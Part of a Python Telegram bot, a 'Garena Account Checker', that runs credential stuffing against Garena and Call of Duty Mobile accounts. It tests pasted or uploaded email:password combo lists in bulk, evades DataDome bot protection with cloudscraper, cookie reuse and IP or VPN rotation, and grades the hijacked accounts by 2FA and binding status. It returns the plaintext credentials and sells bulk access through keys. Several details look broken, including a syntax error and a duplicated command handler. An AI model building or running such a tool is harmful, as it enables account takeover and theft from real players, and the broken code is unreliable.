            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/129.0.0.0 Safari/537.36'
        }
        if cookie_header:
            headers['cookie'] = cookie_header

        response = session.get('https://account.garena.com/api/account/init', headers=headers, timeout=30)

        if response.status_code == 403:
            if datadome_manager.handle_403(session):
                result['status'] = 'ip_blocked'
                result['message'] = "IP Blocked - Change IP/VPN and retry"
                return result
            live_stats.update_stats(valid=False)
            result['message'] = "Access denied (403) - Cookie flagged"
            return result

        try:
            account_data = response.json()
        except json.JSONDecodeError:
            live_stats.update_stats(valid=False)
            result['message'] = "Invalid server response"
            return result

        if 'error' in account_data:
            live_stats.update_stats(valid=False)
            result['message'] = "Error: {}".format(account_data.get('error', 'Unknown'))
            return result

        if 'user_info' in account_data:
            details = parse_account_details(account_data)
        else:
            details = parse_account_details({'user_info': account_data})

        login_history = account_data.get('login_history') or []
        last_login_ip = None
        last_login_where = None
        last_login_ts = None

        if isinstance(login_history, list) and login_history:
            entry = login_history[0]
            if isinstance(entry, dict):
                last_login_ip = entry.get('ip') or entry.get('login_ip')
                last_login_where = entry.get('country') or entry.get('location')
                last_login_ts = entry.get('timestamp')

        def fmt_ts(ts):
            try:
                return datetime.fromtimestamp(int(ts), tz=timezone.utc).strftime('%Y-%m-%d %H:%M:%S UTC')
            except:
                return 'Unknown'

        details['last_login'] = fmt_ts(last_login_ts) if last_login_ts else 'Unknown'
        details['last_login_where'] = last_login_where or 'N/A'
        details['ip_for_msg'] = last_login_ip or account_data.get('init_ip') or 'N/A'
        if account_data.get('country'):
            details['country'] = account_data.get('country')

        has_codm, codm_info = check_codm_account(session, account)

        def is_codm_invalid(info):
            if not info:
                return True
            if isinstance(info, dict):
                invalid_values = ["", "N/A", "NONE", "NULL", "ERROR"]
                if all(str(v).strip().upper() in invalid_values for v in info.values()):
                    return True
                if str(info.get('codm_nickname', '')).strip().upper() in invalid_values:
                    return True
            return False

        if not has_codm or is_codm_invalid(codm_info):
            has_codm = False
            codm_info = None

        live_stats.update_stats(valid=True, clean=details.get('is_clean', False), has_codm=has_codm)

        save_clean_or_notclean(account, password, details, codm_info, result_folder)
        save_account_details_full(account, details, codm_info, password, result_folder)

        fresh_datadome = datadome_manager.extract_datadome_from_session(session)
        if fresh_datadome:
            cookie_manager.save_cookie(fresh_datadome)

        result['status'] = 'valid'
        result['details'] = details
        result['codm_info'] = codm_info
        result['has_codm'] = has_codm
        result['message'] = format_telegram_result(account, password, details, codm_info, has_codm)

        return result

    except Exception as e:
        live_stats.update_stats(valid=False)
        result['message'] = "Error: {}".format(str(e)[:/500])
        return result

def format_tree_details(account, password, details, codm_info, has_codm):
    username = details.get('username', account)
    email = details.get('email', 'N/A')
    email_verified = details.get('email_verified', False)
    mobile = details.get('personal', {}).get('mobile_no', 'N/A')
    mobile_bound = bool(mobile and str(mobile).strip())
    shell = details.get('profile', {}).get('shell_balance', 'N/A')
    country = details.get('personal', {}).get('country', 'N/A')
    auth_app = details.get('security', {}).get('authenticator_app', False)
    two_step = details.get('security', {}).get('two_step_verify', False)
    fb_linked = details.get('security', {}).get('facebook_connected', False)
    is_clean = details.get('is_clean', False)
    status = details.get('status', {}).get('account_status', 'N/A')
    last_login = details.get('last_login', 'Unknown')
    location = details.get('last_login_where', 'N/A')
    ip = details.get('ip_for_msg', 'N/A')

    lines = [
        "🌳 **ACCOUNT DETAILS**",
        f"├─ 🔐 **Login**",
        f"│  ├─ 👤 Username: `{username}`",
        f"│  └─ 🔑 Password: `{password}`",
        f"├─ 📊 **Garena Info**",
        f"│  ├─ 🪪 Shells: `{shell}`",
        f"│  ├─ 🌍 Country: `{country}`",
        f"│  ├─ 📌 Status: `{status}`",
        f"│  ├─ 🕒 Last Login: `{last_login}`",
        f"│  ├─ 📍 Location: `{location}`",
        f"│  └─ 🌐 IP: `{ip}`"
    ]

    if has_codm and codm_info:
        codm_name = codm_info.get('codm_nickname', 'N/A')
        codm_uid = codm_info.get('uid', 'N/A')
        codm_lvl = codm_info.get('codm_level', 'N/A')
        codm_region = codm_info.get('region', 'N/A')
        lines.extend([
            f"├─ 🎮 **CODM Info**",
            f"│  ├─ 🏷️ Nickname: `{codm_name}`",
            f"│  ├─ 🆔 UID: `{codm_uid}`",
            f"│  ├─ 📈 Level: `{codm_lvl}`",
            f"│  └─ 🌏 Region: `{codm_region}`"
        ])
    else:
        lines.append("├─ 🎮 **CODM Info**: ❌ Not linked")

    lines.extend([
        f"├─ 🛡️ **Security**",
        f"│  ├─ 📱 Mobile: `{mobile}` {'✅' if mobile_bound else '❌'}",
        f"│  ├─ 📧 Email: `{email}` {'✅' if email_verified else '❌'}",
        f"│  ├─ 📘 Facebook: {'✅ Linked' if fb_linked else '❌ Not linked'}",
        f"│  ├─ 🔐 Authenticator: {'✅' if auth_app else '❌'}",
        f"│  └─ 🔒 2FA: {'✅' if two_step else '❌'}",
        f"└─ 🧼 **Clean Status**: {'🟢 CLEAN' if is_clean else '🔴 NOT CLEAN'}"
    ])

    return "\n".join(lines)

def format_telegram_result(account, password, details, codm_info, has_codm):
    tree = format_tree_details(account, password, details, codm_info, has_codm)
    plain = (
        "✅ LOGIN SUCCESSFUL\n"
        f"👤 {account}:{password}\n"
        f"🌍 {details.get('personal', {}).get('country', 'N/A')} | 🪪 {details.get('profile', {}).get('shell_balance', 'N/A')}\n"
        f"🧼 {'CLEAN' if details.get('is_clean') else 'NOT CLEAN'}"
    )
    return tree, plain

class UserSession:
    def __init__(self, user_id):
        self.user_id = user_id
        self.session = None
        self.cookie_manager = CookieManager()
        self.datadome_manager = DataDomeManager()
        self.live_stats = LiveStats()
        self.is_running = False
        self.stop_event = Event()
        self.result_folder = "Results_{}".format(user_id)
        self.last_single_check = 0
        self.bulk_key = None
        self.init_session()

    def init_session(self):
        self.session = cloudscraper.create_scraper()
        valid_cookies = self.cookie_manager.get_valid_cookies()
        if valid_cookies:
            combined_cookie_str = "; ".join(valid_cookies)
            applyck(self.session, combined_cookie_str)
            final_cookie_value = valid_cookies[-1]
            if '=' in final_cookie_value:
                datadome_value = final_cookie_value.split('=', 1)[1].strip()
                if datadome_value:
                    self.datadome_manager.set_datadome(datadome_value)
        else:
            datadome = get_datadome_cookie(self.session)
            if datadome:
                self.datadome_manager.set_datadome(datadome)

    def reset_session(self):
        self.session = None
        self.init_session()

def get_user_session(user_id):
    with global_lock:
        if user_id not in user_sessions:
            user_sessions[user_id] = UserSession(user_id)
        return user_sessions[user_id]

# ------------------ BOT COMMANDS ------------------

def single_check_cooldown(func):
    def wrapper(message):
        user_id = message.from_user.id
        us = get_user_session(user_id)
        now = time.time()
        if now - us.last_single_check < 30:
            remaining = int(30 - (now - us.last_single_check))
            bot.reply_to(message, f"⏳ Cooldown: wait {remaining}s before next single check.")
            return
        us.last_single_check = now
        return func(message)
    return wrapper

@bot.message_handler(commands=['start'])
def cmd_start(message):
    user_id = message.from_user.id
    username = message.from_user.first_name or "User"

    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.add(
        types.InlineKeyboardButton("🔍 Single Check", callback_data="menu_single"),
        types.InlineKeyboardButton("📦 Bulk Check", callback_data="menu_file"),
        types.InlineKeyboardButton("📊 Statistics", callback_data="menu_stats"),
        types.InlineKeyboardButton("🔄 Reset Session", callback_data="menu_reset"),
        types.InlineKeyboardButton("ℹ️ Help", callback_data="menu_help"),
        types.InlineKeyboardButton("⏹️ Stop", callback_data="menu_stop"),
        types.InlineKeyboardButton("📁 Get Results", callback_data="menu_results"),
    )

    welcome = (
        "🤖 **Garena Account Checker**\n\n"
        f"👋 Welcome, {username}!\n"
        "────────────────────\n"
        "✅ Check Garena accounts for:\n"
        "• Login validity\n"
        "• Clean/bound status\n"
        "• CODM data & level\n"
        "• Security details\n"
        "────────────────────\n"
        "🔑 **Single check:** Free (30s cooldown)\n"
        "🔐 **Bulk check:** Requires key\n"
        "────────────────────\n"
        "📌 **Commands:**\n"
        "`/check email:pass` – Single check\n"
        "`/redeem <key>` – Redeem a key\n"
        "`/bulk` – Bulk check (needs key)\n"
        "`/file` – Upload .txt combo (needs key)\n"
        "`/stats` – Live statistics\n"
        "`/reset` – Reset session\n"
        "`/stop` – Stop running check\n"
        "`/results` – Download result files\n"
        "────────────────────\n"
        "╔═━━━✦ ❖ ✦━━━═╗\n"
        "     @YAKAMUCHIII\n"
        "╚═━━━✦ ❖ ✦━━━═╝\n"
    )

    bot.send_message(message.chat.id, welcome, reply_markup=markup, parse_mode="Markdown")

@bot.message_handler(commands=['help'])
def cmd_help(message):
    help_text = (
        "ℹ️ **HELP & USAGE**\n"
        "────────────────────\n\n"
        "🔍 **Single Check (FREE):**\n"
        "`/check email@example.com:password123`\n"
        "⏱️ 30 seconds cooldown between checks.\n\n"
        "🔐 **Bulk Check (KEY REQUIRED):**\n"
        "1. Obtain a key from admin.\n"
        "2. Redeem it with `/redeem <key>`\n"
        "3. Use `/bulk` or `/file`.\n"
        "4. Paste accounts or upload file.\n"
        "Max 500 accounts per check.\n\n"
        "⚙️ **Other Commands:**\n"
        "`/stats` – View your session stats\n"
        "`/reset` – Reset session & cookies\n"
        "`/stop` – Stop current bulk check\n"
        "`/results` – Get result files\n\n"
        "📁 **Results saved in folders:**\n"
        "`clean.txt` / `notclean.txt`\n"
        "`full_details.txt`\n"
        "`Clean/NotClean > Country > Level`\n\n"
        "────────────────────\n"
        "╔═━━━✦ ❖ ✦━━━═╗\n"
        "     @YAKAMUCHIII\n"
        "╚═━━━✦ ❖ ✦━━━═╝"
    )
    bot.send_message(message.chat.id, help_text, parse_mode="Markdown")

@bot.callback_query_handler(func=lambda call: call.data.startswith("menu_"))
def handle_menu_callbacks(call):
    user_id = call.from_user.id
    action = call.data.replace("menu_", "")

    if action == "single":
        bot.answer_callback_query(call.id)
        bot.send_message(call.message.chat.id,
                         "🔍 **Single Account Check**\n\n"
                         "Send in this format:\n"
                         "`/check email@example.com:password`\n"
                         "⏱️ Cooldown: 30 seconds.",
                         parse_mode="Markdown")

    elif action == "file":
        bot.answer_callback_query(call.id)
        bot.send_message(call.message.chat.id,
                         "📦 **File Check (Key Required)**\n\n"
                         "Send `/file` and then upload a .txt file.\n"
                         "Each line: `email:password`\n"
                         "Max 500 accounts.\n"
                         "You'll be asked for a key if not redeemed.",
                         parse_mode="Markdown")

    elif action == "stats":
        bot.answer_callback_query(call.id)
        us = get_user_session(user_id)
        bot.send_message(call.message.chat.id, us.live_stats.format_stats_telegram())

    elif action == "reset":
        bot.answer_callback_query(call.id)
        us = get_user_session(user_id)
        us.reset_session()
        us.live_stats = LiveStats()
        bot.send_message(call.message.chat.id, "✅ Session reset successfully!")

    elif action == "help":
        bot.answer_callback_query(call.id)
        cmd_help(call.message)

    elif action == "stop":
        bot.answer_callback_query(call.id)
        us = get_user_session(user_id)
        if us.is_running:
            us.stop_event.set()
            us.is_running = False
            bot.send_message(call.message.chat.id, "⏹️ Stopping current check...")
        else:
            bot.send_message(call.message.chat.id, "ℹ️ No check is currently running.")

    elif action == "results":
        bot.answer_callback_query(call.id)
        us = get_user_session(user_id)
        send_result_files(call.message.chat.id, us.result_folder)

@bot.message_handler(commands=['check'])
@single_check_cooldown
def cmd_check_single(message):
    user_id = message.from_user.id
    us = get_user_session(user_id)
    chat_type = message.chat.type

    # Restrict private chat usage unless user has a valid key
    if chat_type == 'private':
        if not us.bulk_key:
            bot.reply_to(message,
                "❌ Single check is only available in public channels/groups.\n"
                "To use in private chat, redeem a key first with:\n"
                "/redeem <key>"
            )
            return
        else:
            valid, msg_text, _ = key_manager.validate_key(us.bulk_key, user_id)
            if not valid:
                bot.reply_to(message, f"❌ Your key is no longer valid: {msg_text}")
                us.bulk_key = None
                return

    args = message.text.split(maxsplit=1)

    if len(args) < 2 or ':' not in args[1]:
        bot.send_message(
            message.chat.id,
            "❌ Invalid format!\n\n"
            "Usage: `/check email@example.com:password`",
            parse_mode="Markdown"
        )
        return

    account_line = args[1].strip()
    try:
        account, password = account_line.split(':', 1)
    except:
        bot.send_message(message.chat.id, "❌ Invalid format. Use `email:password`", parse_mode="Markdown")
        return

    account = account.strip()
    password = password.strip()

    if not account or not password:
        bot.send_message(message.chat.id, "❌ Account or password is empty!")
        return

    if us.is_running:
        bot.send_message(message.chat.id, "⚠️ A check is already running. Use /stop first.")
        return

    status_msg = bot.send_message(
        message.chat.id,
        f"🔍 Checking `{account}`...\nPlease wait ⏳",
        parse_mode="Markdown"
    )

    def do_check():
        us.is_running = True
        try:
            check_result = processaccount(
                us.session, account, password,
                us.cookie_manager, us.datadome_manager,
                us.live_stats, us.result_folder
            )

            if check_result['status'] == 'valid':
                tree, plain = format_telegram_result(
                    account, password, check_result['details'],
                    check_result['codm_info'], check_result['has_codm']
                )
                try:
                    bot.edit_message_text(
                        tree,
                        chat_id=message.chat.id,
                        message_id=status_msg.message_id,
                        parse_mode="Markdown"
                    )
                except:
                    bot.edit_message_text(
                        plain,
                        chat_id=message.chat.id,
                        message_id=status_msg.message_id
                    )
            elif check_result['status'] == 'ip_blocked':
                bot.edit_message_text(
                    "🚫 IP BLOCKED!\nChange IP/VPN and use /reset.",
                    chat_id=message.chat.id,
                    message_id=status_msg.message_id
                )
            else:
                bot.edit_message_text(
                    f"❌ Login Failed\nAccount: `{account}`\nReason: {check_result.get('message', 'Invalid credentials')}",
                    chat_id=message.chat.id,
                    message_id=status_msg.message_id,
                    parse_mode="Markdown"
                )
        except Exception as e:
            try:
                bot.edit_message_text(
                    f"⚠️ Error: {str(e)[:200]}",
                    chat_id=message.chat.id,
                    message_id=status_msg.message_id
                )
            except:
                pass
        finally:
            us.is_running = False

    thread = threading.Thread(target=do_check, daemon=True)
    thread.start()

@bot.message_handler(commands=['redeem'])
def cmd_redeem(message):
    user_id = message.from_user.id
    args = message.text.split(maxsplit=1)
    if len(args) < 2:
        bot.reply_to(message, "Usage: /redeem <key>")
        return
    key = args[1].strip().upper()
    us = get_user_session(user_id)
    valid, msg_text, remaining = key_manager.validate_key(key, user_id)
    if valid:
        us.bulk_key = key
        bot.reply_to(message, f"✅ Key redeemed successfully!\nDaily remaining: {remaining if remaining != float('inf') else 'Unlimited'}")
    else:
        bot.reply_to(message, msg_text)

@bot.message_handler(commands=['bulk'])
def cmd_bulk(message):
    user_id = message.from_user.id
    us = get_user_session(user_id)

    if us.is_running:
        bot.send_message(message.chat.id, "⚠️ A check is already running. Use /stop first.")
        return

    # If user already has a valid key redeemed, skip key prompt
    if us.bulk_key:
        valid, msg_text, remaining = key_manager.validate_key(us.bulk_key, user_id)
        if valid:
            bot.send_message(message.chat.id,
                             f"✅ Using redeemed key. Daily remaining: {remaining if remaining != float('inf') else 'Unlimited'}\n\n"
                             "Now send me the accounts, one per line:\n"
                             "`email1:pass1`\n"
                             "`email2:pass2`\n"
                             "Max 500 accounts.\n"
                             "Or send /cancel to cancel.",
                             parse_mode="Markdown")
            bot.register_next_step_handler(message, process_bulk_text)
            return
        else:
            us.bulk_key = None  # clear invalid key
            bot.send_message(message.chat.id, f"Your redeemed key is no longer valid: {msg_text}")

    # Otherwise ask for key
    msg = bot.send_message(message.chat.id,
                           "🔐 **Bulk Check - Key Required**\n\n"
                           "Please enter your access key (or /cancel):",
                           parse_mode="Markdown")
    bot.register_next_step_handler(msg, process_bulk_key)

def process_bulk_key(message):
    user_id = message.from_user.id
    us = get_user_session(user_id)
    if message.text and message.text.strip().lower() == '/cancel':
        bot.send_message(message.chat.id, "❌ Cancelled.")
        return
    key = message.text.strip()
    valid, msg_text, remaining = key_manager.validate_key(key, user_id)
    if not valid:
        bot.send_message(message.chat.id, msg_text)
        return

    us.bulk_key = key
    bot.send_message(message.chat.id,
                     f"✅ Key accepted. Daily remaining: {remaining if remaining != float('inf') else 'Unlimited'}\n\n"
                     "Now send me the accounts, one per line:\n"
                     "`email1:pass1`\n"
                     "`email2:pass2`\n"
                     "Max 500 accounts.\n"
                     "Or send /cancel to cancel.",
                     parse_mode="Markdown")
    bot.register_next_step_handler(message, process_bulk_text)

def process_bulk_text(message):
    user_id = message.from_user.id

    if message.text and message.text.strip().lower() == '/cancel':
        bot.send_message(message.chat.id, "❌ Bulk check cancelled.")
        return

    if not message.text:
        bot.send_message(message.chat.id, "❌ No text received. Send accounts as text.")
        return

    lines = [l.strip() for l in message.text.strip().split('\n') if l.strip() and ':' in l]

    if not lines:
        bot.send_message(message.chat.id, "❌ No valid accounts found. Format: email:password")
        return

    run_bulk_check(message.chat.id, user_id, lines)

@bot.message_handler(commands=['file'])
def cmd_file(message):
    user_id = message.from_user.id
    us = get_user_session(user_id)

    if us.is_running:
        bot.send_message(message.chat.id, "⚠️ A check is already running. Use /stop first.")
        return

    if us.bulk_key:
        valid, msg_text, remaining = key_manager.validate_key(us.bulk_key, user_id)
        if valid:
            bot.send_message(message.chat.id,
                             f"✅ Using redeemed key. Daily remaining: {remaining if remaining != float('inf') else 'Unlimited'}\n\n"
                             "Now upload a .txt file with accounts.\n"
                             "Each line: `email:password`\n"
                             "Max 500 accounts.\n"
                             "Or send /cancel to cancel.",
                             parse_mode="Markdown")
            bot.register_next_step_handler(message, process_file_upload)
            return
        else:
            us.bulk_key = None
            bot.send_message(message.chat.id, f"Your redeemed key is no longer valid: {msg_text}")

    msg = bot.send_message(message.chat.id,
                           "🔐 **File Check - Key Required**\n\n"
                           "Please enter your access key (or /cancel):",
                           parse_mode="Markdown")
    bot.register_next_step_handler(msg, process_file_key)

def process_file_key(message):
    user_id = message.from_user.id
    us = get_user_session(user_id)
    if message.text and message.text.strip().lower() == '/cancel':
        bot.send_message(message.chat.id, "❌ Cancelled.")
        return
    key = message.text.strip()
    valid, msg_text, remaining = key_manager.validate_key(key, user_id)
    if not valid:
        bot.send_message(message.chat.id, msg_text)
        return

    us.bulk_key = key
    bot.send_message(message.chat.id,
                     f"✅ Key accepted. Daily remaining: {remaining if remaining != float('inf') else 'Unlimited'}\n\n"
                     "Now upload a .txt file with accounts.\n"
                     "Each line: `email:password`\n"
                     "Max 500 accounts.\n"
                     "Or send /cancel to cancel.",
                     parse_mode="Markdown")
    bot.register_next_step_handler(message, process_file_upload)

def process_file_upload(message):
    user_id = message.from_user.id

    if message.text and message.text.strip().lower() == '/cancel':
        bot.send_message(message.chat.id, "❌ File check cancelled.")
        return

    if not message.document:
        bot.send_message(message.chat.id, "📎 Please upload a .txt file.")
        return

    if not message.document.file_name.endswith('.txt'):
        bot.send_message(message.chat.id, "⚠️ Only .txt files are accepted.")
        return

    try:
        file_info = bot.get_file(message.document.file_id)
        downloaded = bot.download_file(file_info.file_path)
        content = downloaded.decode('utf-8', errors='ignore')
        lines = [l.strip() for l in content.split('\n') if l.strip() and ':' in l]

        if not lines:
            bot.send_message(message.chat.id, "❌ No valid accounts found in the file.")
            return

        bot.send_message(
            message.chat.id,
            f"📂 File loaded: `{message.document.file_name}`\n"
            f"🔢 Found {len(lines)} accounts\n"
            "🚀 Starting check...",
            parse_mode="Markdown"
        )

        run_bulk_check(message.chat.id, user_id, lines)

    except Exception as e:
        bot.send_message(message.chat.id, f"⚠️ Error reading file: {str(e)[:200]}")

def run_bulk_check(chat_id, user_id, lines):
    us = get_user_session(user_id)

    if us.is_running:
        bot.send_message(chat_id, "⚠️ A check is already running. Use /stop first.")
        return

    if not us.bulk_key:
        bot.send_message(chat_id, "❌ No key provided. Use /redeem or start with /bulk /file.")
        return

    # Validate key again and check daily limit against number of lines
    valid, msg_text, remaining = key_manager.validate_key(us.bulk_key, user_id)
    if not valid:
        bot.send_message(chat_id, msg_text)
        return

    MAX_ACCOUNTS = 10000
    total_lines = len(lines)
    if total_lines > MAX_ACCOUNTS:
        bot.send_message(
            chat_id,
            f"⚠️ Maximum {MAX_ACCOUNTS} accounts allowed per bulk check.\n"
            f"Processing only the first {MAX_ACCOUNTS} accounts."
        )
        lines = lines[:MAX_ACCOUNTS]
        total = MAX_ACCOUNTS
    else:
        total = total_lines

    if total == 0:
        bot.send_message(chat_id, "❌ No valid accounts to check.")
        return

    # Check daily limit against total lines to process
    if remaining != float('inf') and total > remaining:
        bot.send_message(chat_id, f"❌ Daily limit exceeded. You can check {int(remaining)} more accounts today, but you provided {total}.")
        return

    # Notify admin
    for admin_id in ADMIN_IDS:
        try:
            bot.send_message(admin_id,
                             f"🔑 Key used: `{us.bulk_key}`\n"
                             f"👤 User: {user_id}\n"
                             f"📊 Lines: {total}",
                             parse_mode="Markdown")
        except:
            pass

    status_msg = bot.send_message(
        chat_id,
        f"🚀 **Bulk Check Started**\n"
        f"📊 Total: {total} accounts\n"
        f"⏳ Progress: 0/{total}\n"
        f"🔄 Status: Initializing...",
        parse_mode="Markdown"
    )

    def do_bulk():
        us.is_running = True
        us.stop_event.clear()
        start_time = time.time()
        processed = 0

        for i, line in enumerate(lines, 1):
            if us.stop_event.is_set():
                bot.send_message(chat_id, "🛑 Check stopped by user.")
                break

            try:
                account, password = line.split(':', 1)
                account = account.strip()
                password = password.strip()
                if not account or not password:
                    continue
            except:
                continue

            if i % 5 == 0 or i == 1:
                stats = us.live_stats.get_stats()
                elapsed = time.time() - start_time
                eta = (elapsed / i) * (total - i) if i > 0 else 0
                progress_text = (
                    f"📈 **Progress**: {i}/{total}\n"
                    f"✅ Valid: {stats['valid']} | ❌ Invalid: {stats['invalid']}\n"
                    f"⏱️ Elapsed: {int(elapsed)}s | ETA: {int(eta)}s\n"
                    f"🔄 Current: `{account}`"
                )
                try:
                    bot.edit_message_text(
                        f"🚀 Bulk Check Running\n{progress_text}",
                        chat_id=chat_id,
                        message_id=status_msg.message_id,
                        parse_mode="Markdown"
                    )
                except:
                    pass

            check_result = processaccount(
                us.session, account, password,
                us.cookie_manager, us.datadome_manager,
                us.live_stats, us.result_folder
            )

            if check_result['status'] == 'ip_blocked':
                bot.send_message(
                    chat_id,
                    "🚫 **IP BLOCKED!**\n\n"
                    "Change your IP/VPN and use /reset, then restart."
                )
                break

            processed += 1
            time.sleep(0.5)

        # Record key usage
        key_manager.record_usage(us.bulk_key, user_id, processed)

        stats = us.live_stats.get_stats()
        elapsed_total = time.time() - start_time
        success_rate = (stats['valid'] / stats['total'] * 500) if stats['total'] > 0 else 0

        final_msg = (
            "✅ **BULK CHECK COMPLETED**\n"
            "```\n"
            f"📊 Processed : {stats['total']}\n"
            f"✅ Valid     : {stats['valid']}\n"
            f"❌ Invalid   : {stats['invalid']}\n"
            f"🧼 Clean     : {stats['clean']}\n"
            f"⚠️ Not Clean : {stats['not_clean']}\n"
            f"🎮 Has CODM  : {stats['has_codm']}\n"
            f"🚫 No CODM   : {stats['no_codm']}\n"
            f"📈 Success   : {success_rate:.1f}%\n"
            f"⏱️ Time      : {int(elapsed_total)}s\n"
            "```\n"
            "📁 Results are ready. Sending files..."
        )
        try:
            bot.edit_message_text(
                final_msg,
                chat_id=chat_id,
                message_id=status_msg.message_id,
                parse_mode="Markdown"
            )
        except:
            bot.send_message(chat_id, final_msg, parse_mode="Markdown")

        send_result_files(chat_id, us.result_folder)
        us.is_running = False

    thread = threading.Thread(target=do_bulk, daemon=True)
    thread.start()

def send_result_files(chat_id, result_folder):
    files = [
        ('clean.txt', '🧼 Clean Accounts'),
        ('notclean.txt', '⚠️ Not Clean Accounts'),
        ('full_details.txt', '📋 Full Details')
    ]

    for filename, caption in files:
        filepath = os.path.join(result_folder, filename)
        if os.path.exists(filepath) and os.path.getsize(filepath) > 0:
            try:
                with open(filepath, 'rb') as f:
                    bot.send_document(
                        chat_id, f,
                        caption=f"{caption}\n📁 {filename}",
                        visible_file_name=filename
                    )
            except Exception as e:
                bot.send_message(chat_id, f"⚠️ Could not send {filename}: {str(e)[:500]}")

    base = os.path.join(result_folder, 'Clean')
    if os.path.exists(base):
        for country in os.listdir(base):
            country_path = os.path.join(base, country)
            if os.path.isdir(country_path):
                for lvl_file in os.listdir(country_path):
                    if lvl_file.endswith('_accounts.txt'):
                        filepath = os.path.join(country_path, lvl_file)
                        if os.path.getsize(filepath) > 0:
                            try:
                                with open(filepath, 'rb') as f:
                                    bot.send_document(
                                        chat_id, f,
                                        caption=f"🎮 CODM | {country} | {lvl_file}",
                                        visible_file_name=f"{country}_{lvl_file}"
                                    )
                            except:
                                pass

@bot.message_handler(commands=['stats'])
def cmd_stats(message):
    user_id = message.from_user.id
    us = get_user_session(user_id)
    bot.send_message(message.chat.id, us.live_stats.format_stats_telegram())

@bot.message_handler(commands=['reset'])
def cmd_reset(message):
    user_id = message.from_user.id
    us = get_user_session(user_id)

    if us.is_running:
        bot.send_message(message.chat.id,
                         "⚠️ Cannot reset while a check is running.\n"
                         "Use /stop first.")
        return

    us.reset_session()
    us.live_stats = LiveStats()
    bot.send_message(message.chat.id,
                     "✅ Session Reset!\n\n"
                     "New session created\n"
                     "Stats cleared\n"
                     "Ready for new checks")

@bot.message_handler(commands=['stop'])
def cmd_stop(message):
    user_id = message.from_user.id
    us = get_user_session(user_id)

    if us.is_running:
        us.stop_event.set()
        us.is_running = False
        bot.send_message(message.chat.id, "⏹️ Stopping check... Will stop after current account finishes.")
    else:
        bot.send_message(message.chat.id, "ℹ️ No check is currently running.")

@bot.message_handler(commands=['results'])
def cmd_results(message):
    user_id = message.from_user.id
    us = get_user_session(user_id)
    send_result_files(message.chat.id, us.result_folder)

# ------------------ ADMIN COMMANDS ------------------

@bot.message_handler(commands=['ap'])
def admin_panel(message):
    user_id = message.from_user.id
    if user_id not in ADMIN_IDS:
        return
    markup = types.InlineKeyboardMarkup(row_width=1)
    markup.add(
        types.InlineKeyboardButton("🔑 Generate Key", callback_data="admin_genkey"),
        types.InlineKeyboardButton("📋 List Keys", callback_data="admin_listkeys"),
        types.InlineKeyboardButton("🗑️ Delete Key", callback_data="admin_deletekey"),
    )
    bot.send_message(message.chat.id, "🛠️ **Admin Panel**", reply_markup=markup, parse_mode="Markdown")

# ------------------ FIXED ADMIN CALLBACKS ------------------

@bot.callback_query_handler(func=lambda call: call.data.startswith("admin_"))
def admin_callbacks(call):
    user_id = call.from_user.id
    if user_id not in ADMIN_IDS:
        bot.answer_callback_query(call.id, "Unauthorized")
        return

    action = call.data.replace("admin_", "")

    if action == "genkey":
        bot.answer_callback_query(call.id)
        msg = bot.send_message(
            call.message.chat.id,
            "🔑 Generate New Key\n\n"
            "Enter: days daily_limit usage_limit\n"
            "Example: 30 500 1\n"
            "(0 days = lifetime, 0 limit = unlimited, usage_limit = max users)\n"
            "Send /cancel to abort."
            # Removed parse_mode to avoid Markdown errors
        )
        bot.register_next_step_handler(msg, process_genkey)

    elif action == "listkeys":
        bot.answer_callback_query(call.id)
        keys = key_manager.list_keys()
        if not keys:
            bot.send_message(call.message.chat.id, "No keys found.")
            return
        text = "📋 Active Keys:\n"
        for k, data in keys.items():
            exp = data.get('expires')
            exp_str = "Lifetime" if exp is None else exp[:10]
            used = len(data.get('used_by', []))
            text += f"`{k}` | Exp: {exp_str} | Users: {used}/{data.get('usage_limit',1)} | Daily: {data.get('daily_limit',0)}\n"
        bot.send_message(call.message.chat.id, text, parse_mode="Markdown")

    elif action == "deletekey":
        bot.answer_callback_query(call.id)
        msg = bot.send_message(call.message.chat.id, "Enter key to delete:")
        bot.register_next_step_handler(msg, process_deletekey)


# ------------------ NEW REDEEM COMMAND ------------------

@bot.message_handler(commands=['redeem'])
def cmd_redeem(message):
    user_id = message.from_user.id
    us = get_user_session(user_id)

    args = message.text.split()
    if len(args) != 2:
        bot.reply_to(message, "Usage: /redeem <key>")
        return

    key = args[1].strip()
    valid, msg_text, remaining = key_manager.validate_key(key, user_id)

    if valid:
        us.bulk_key = key
        bot.reply_to(
            message,
            f"✅ Key successfully redeemed!\n"
            f"Daily remaining checks: {remaining if remaining != float('inf') else 'Unlimited'}\n"
            f"You can now use /bulk or /file."
        )
    else:
        bot.reply_to(message, msg_text)

def process_genkey(message):
    user_id = message.from_user.id
    if user_id not in ADMIN_IDS:
        return
    if message.text and message.text.strip().lower() == '/cancel':
        bot.send_message(message.chat.id, "Cancelled.")
        return
    parts = message.text.strip().split()
    if len(parts) != 3:
        bot.send_message(message.chat.id, "Invalid format. Use: days daily_limit usage_limit")
        return
    try:
        days = int(parts[0])
        daily_limit = int(parts[1])
        usage_limit = int(parts[2])
    except:
        bot.send_message(message.chat.id, "Numbers only.")
        return

    key = key_manager.generate_key(days=days, daily_limit=daily_limit, usage_limit=usage_limit)
    bot.send_message(message.chat.id,
                     f"✅ Key generated:\n`{key}`\n"
                     f"Days: {days if days>0 else 'Lifetime'}\n"
                     f"Daily limit: {daily_limit if daily_limit>0 else 'Unlimited'}\n"
                     f"Usage limit: {usage_limit} user(s)",
                     parse_mode="Markdown")

def process_deletekey(message):
    user_id = message.from_user.id
    if user_id not in ADMIN_IDS:
        return
    if message.text and message.text.strip().lower() == '/cancel':
        bot.send_message(message.chat.id, "Cancelled.")
        return
    key = message.text.strip()
    if key_manager.delete_key(key):
        bot.send_message(message.chat.id, f"✅ Key `{key}` deleted.")
    else:
        bot.send_message(message.chat.id, "❌ Key not found.")

@bot.message_handler(commands=['delete'])
def cmd_delete_key(message):
    user_id = message.from_user.id
    if user_id not in ADMIN_IDS:
        return
    args = message.text.split()
    if len(args) != 2:
        bot.reply_to(message, "Usage: /delete <key>")
        return
    key = args[1].strip().upper()
    if key_manager.delete_key(key):
        bot.reply_to(message, f"✅ Key `{key}` deleted.")
    else:
        bot.reply_to(message, "❌ Key not found.")

# Handle direct account paste
@bot.message_handler(func=lambda m: m.text and ':' in m.text and not m.text.startswith('/'))
def handle_direct_account(message):
    user_id = message.from_user.id
    text = message.text.strip()
    lines = [l.strip() for l in text.split('\n') if l.strip() and ':' in l]
    if not lines:
        return
    if len(lines) == 1:
        message.text = "/check " + lines[0]
